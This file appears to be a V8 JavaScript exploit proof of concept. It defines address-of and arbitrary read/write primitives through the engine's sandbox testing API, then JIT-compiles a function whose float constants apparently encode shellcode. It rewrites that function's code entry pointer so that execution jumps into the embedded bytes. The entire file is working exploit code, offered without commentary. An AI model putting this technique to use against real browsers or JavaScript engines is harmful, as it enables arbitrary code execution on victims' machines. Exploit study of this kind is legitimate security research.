const addrof = o => {
    return Sandbox.getAddressOf(o);
};

const weak_read = p => {
    let reader = new Sandbox.MemoryView(p, 64);
    let view = new DataView(reader);
    return view.getBigUint64(0, true); 
};

const weak_write = (p, x) => {
    let writer = new Sandbox.MemoryView(p, 64);
    let view = new DataView(writer);
    view.setBigUint64(0, x, true);
};

const foo = () => {
    return [
      1.9711828979523134e-246,
      1.9562205631094693e-246,
      1.9557819155246427e-246,
      1.9711824228871598e-246,
      1.971182639857203e-246,
      1.9711829003383248e-246,
      1.9895153920223886e-246,
      1.971182898881177e-246
    ];
}

%PrepareFunctionForOptimization(foo);
foo();
%OptimizeFunctionOnNextCall(foo);
foo();

%DebugPrint(foo);

code = weak_read(addrof(foo)+0xc)&0xFFFFFFFFn;
console.log(code.toString(16));

entry = weak_read(Number(code+0xfn))
console.log(entry.toString(16))

weak_write(Number(code+0xfn), entry+0x53n)
